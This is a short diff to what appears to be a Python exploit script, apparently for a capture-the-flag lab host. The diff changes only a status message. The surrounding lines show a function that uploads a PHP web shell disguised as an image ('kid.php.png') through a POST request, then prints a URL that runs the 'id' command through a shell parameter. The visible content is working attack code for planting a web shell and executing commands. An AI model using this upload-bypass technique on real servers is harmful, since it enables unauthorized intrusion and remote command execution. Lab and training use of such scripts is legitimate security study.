@@ -25,7 +25,7 @@ def UploadWebShell():
         print("[*] Uploading the webshell...")
         r = requests.post(url, headers=headers, cookies=cookies, data=data)
         if "The file kid.php.png has been uploaded." in r.text:
-            print("[+] Web shell has been uploaded successfully")
+            print("[+] Webshell has been uploaded successfully")
             print("[+] Verify: http://10.10.10.185/images/uploads/kid.php.png?shell=id")
     except Exception as e:
         print("[-] Failed to upload the webshell: ", e)
